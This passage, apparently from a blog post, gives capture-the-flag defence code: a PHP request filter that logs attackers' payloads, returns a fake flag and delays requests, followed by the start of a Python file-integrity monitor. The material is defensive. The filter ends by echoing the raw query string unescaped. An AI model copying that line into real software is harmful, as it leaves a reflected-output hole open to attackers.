style=\"color: #FFCB6B\"> = str_replace(&quot;&#39;&quot;, &quot;‘&quot;, $str);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    $str = str_replace(&quot;\\&quot;&quot;, &quot;“&quot;, $str);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    $str = str_replace(&quot;&lt;&quot;, &quot;《&quot;, $str);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    $str = str_replace(&quot;&gt;&quot;, &quot;》&quot;, $str);</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    return $str;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">/*</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">获取http的请求包，意义在于获取别人的攻击payload</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">*/</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">function get_http_raw() &#123; </span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    $raw = &#39;&#39;; </span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">    $raw .= $_SERVER[&#39;REQUEST_METHOD&#39;].&#39;</span><span style=\"color: #C3E88D\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.$_SERVER[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">REQUEST_URI</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">].</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.$_SERVER[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">SERVER_PROTOCOL</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">].&quot;\\r\\n&quot;; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">     </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    foreach($_SERVER as $key =&gt; $value) &#123; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        if(substr($key, 0, 5) === </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">HTTP_</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">) &#123; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">            $key = substr($key, 5); </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">            $key = str_replace(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">_</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">, </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">-</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">, $key); </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">            $raw .= $key.</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">: </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">.$value.&quot;\\r\\n&quot;; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        &#125; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    &#125; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    $raw .= &quot;\\r\\n&quot;; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    $raw .= file_get_contents(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">php://input</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">); </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    return $raw; </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">/*</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">这里拦截并记录攻击payload</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">*/</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">function write_attack_log($alert)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    $data = date(&quot;Y/m/d H:i:s&quot;).&quot; -- [&quot;.$alert.&quot;]&quot;.&quot;\\r\\n&quot;.get_http_raw().&quot;\\r\\n\\r\\n&quot;;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    $ffff = fopen(</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">log_is_a_secret_file.txt</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">, </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">a</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">); //日志路径 </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    fwrite($ffff, $data);  </span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    fclose($ffff);</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    if($alert == </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">GETFLAG</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">)&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        echo &quot;HCTF&#123;aaaa&#125;&quot;; //如果请求带有flag关键字，显示假的flag。（2333333）</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    &#125;else&#123;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">        sleep(15); //拦截前延时15秒</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    &#125;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">    exit(0);</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">&#125;</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">echo $_SERVER[</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">QUERY_STRING</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">];</span></span>\n<span class=\"line\"><span style=\"color: #C3E88D\">?&gt;</span></span>\n<span class=\"line\"></span></code></pre></div><h3 id=\"文件监控\"><a href=\"#文件监控\" class=\"headerlink\" title=\"文件监控\"></a>文件监控</h3><div class=\"language-shell\"><button title=\"Copy code\" class=\"copy\"></button><span class=\"lang\">shell</span><pre class=\"shiki material-theme-palenight\" style=\"background-color: #1a1a1a\" tabindex=\"0\"><code><span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># -*- coding: utf-8 -*-</span></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\">#use: python file_check.py ./</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">hashlib</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">shutil</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ntpath</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">time</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">CWD</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.getcwd</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">FILE_MD5_DICT</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&#123;&#125;</span><span style=\"color: #BABED8\">      </span><span style=\"color: #676E95; font-style: italic\"># 文件MD5字典</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">ORIGIN_FILE_LIST</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> []</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 特殊文件路径字符串</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Special_path_str</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">drops_JWI96TY7ZKNMQPDRUOSG0FLH41A3C5EXVB82</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">bakstring</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">bak_EAR1IBM0JT9HZ75WU4Y3Q8KLPCX26NDFOGVS</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">logstring</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">log_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">webshellstring</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">webshell_WMY4RVTLAJFB28960SC3KZX7EUP1IHOQN5GD</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">difffile</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">diff_UMTGPJO17F82K35Z0LEDA6QB9WH4IYRXVSCN</span><span style=\"color: #89DDFF\">&#39;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Special_string</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #C3E88D\">drops_log</span><span style=\"color: #89DDFF\">&#39;</span><span style=\"color: #BABED8\">  </span><span style=\"color: #676E95; font-style: italic\"># 免死金牌</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">UNICODE_ENCODING</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">utf-8</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">INVALID_UNICODE_CHAR_FORMAT</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">r</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">\\?%02x</span><span style=\"color: #89DDFF\">&quot;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 文件路径字典</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">spec_base_path</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.realpath</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(CWD,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">Special_path_str</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">Special_path</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">&#123;</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">&#39;bak&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.realpath</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(spec_base_path,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">bakstring</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">&#39;log&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.realpath</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(spec_base_path,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">logstring</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">&#39;webshell&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.realpath</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(spec_base_path,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">webshellstring</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">&#39;difffile&#39;</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">:</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.realpath</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">os.path.join(spec_base_path,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">difffile</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">),</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">&#125;</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">isListLike</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">isinstance</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value,</span><span style=\"color: #BABED8\"> (list, </span><span style=\"color: #C3E88D\">tuple,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">set</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 获取Unicode编码</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getUnicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">encoding=None,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">noneToNull=False</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">noneToNull</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">and</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">is</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">None:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">NULL</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">isListLike(value</span><span style=\"color: #BABED8\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">list</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">getUnicode(_,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">encoding,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">noneToNull</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">for</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">_</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">isinstance(value,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">unicode</span><span style=\"color: #BABED8\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">elif</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">isinstance(value,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">basestring</span><span style=\"color: #BABED8\">):</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">while</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">True:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">unicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">encoding</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">or</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">UNICODE_ENCODING</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">UnicodeDecodeError,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ex:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">unicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">UNICODE_ENCODING</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">except:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                    </span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value[:ex.start]</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #89DDFF\">&quot;&quot;</span><span style=\"color: #C3E88D\">.join</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">INVALID_UNICODE_CHAR_FORMAT</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">%</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">ord</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">_</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">for</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">_</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value[ex.start:ex.end]</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">+</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">value[ex.end:]</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    else:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">unicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">value</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">UnicodeDecodeError:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">unicode</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">str(value</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">errors=</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #C3E88D\">ignore</span><span style=\"color: #89DDFF\">&quot;</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 目录创建</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">mkdir_p</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">path</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">import</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">errno</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">os.makedirs(path</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">except</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">OSError</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">as</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">exc:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">exc.errno</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">==</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">errno.EEXIST</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">and</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.isdir</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">path</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">pass</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        else: raise</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 获取当前所有文件路径</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">getfilelist</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">cwd</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">filelist</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> []</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> root,subdirs, files </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> os.walk</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">cwd</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #89DDFF; font-style: italic\">for</span><span style=\"color: #BABED8\"> filepath </span><span style=\"color: #89DDFF; font-style: italic\">in</span><span style=\"color: #BABED8\"> files:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">originalfile</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">os.path.join</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">root,</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filepath</span><span style=\"color: #89DDFF\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: italic\">if</span><span style=\"color: #BABED8\"> </span><span style=\"color: #FFCB6B\">Special_path_str</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">not</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">in</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">originalfile:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">                </span><span style=\"color: #FFCB6B\">filelist.append(originalfile</span><span style=\"color: #BABED8\">)</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #89DDFF; font-style: italic\">return</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">filelist</span></span>\n<span class=\"line\"></span>\n<span class=\"line\"><span style=\"color: #676E95; font-style: italic\"># 计算机文件MD5值</span></span>\n<span class=\"line\"><span style=\"color: #FFCB6B\">def</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">calcMD5</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #C3E88D\">:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">    </span><span style=\"color: #FFCB6B\">try:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">        </span><span style=\"color: #FFCB6B\">with</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">open</span><span style=\"color: #89DDFF\">(</span><span style=\"color: #FFCB6B\">filepath,</span><span style=\"color: #FFCB6B\">&#39;rb&#39;</span><span style=\"color: #89DDFF\">)</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">as</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">f:</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">md5obj</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">hashlib.md5</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #FFCB6B\">md5obj.update(f.read(</span><span style=\"color: #BABED8\">))</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #82AAFF\">hash</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">=</span><span style=\"color: #BABED8\"> </span><span style=\"color: #C3E88D\">md5obj.hexdigest</span><span style=\"color: #89DDFF\">()</span></span>\n<span class=\"line\"><span style=\"color: #BABED8\">            </span><span style=\"color: #89DDFF; font-style: 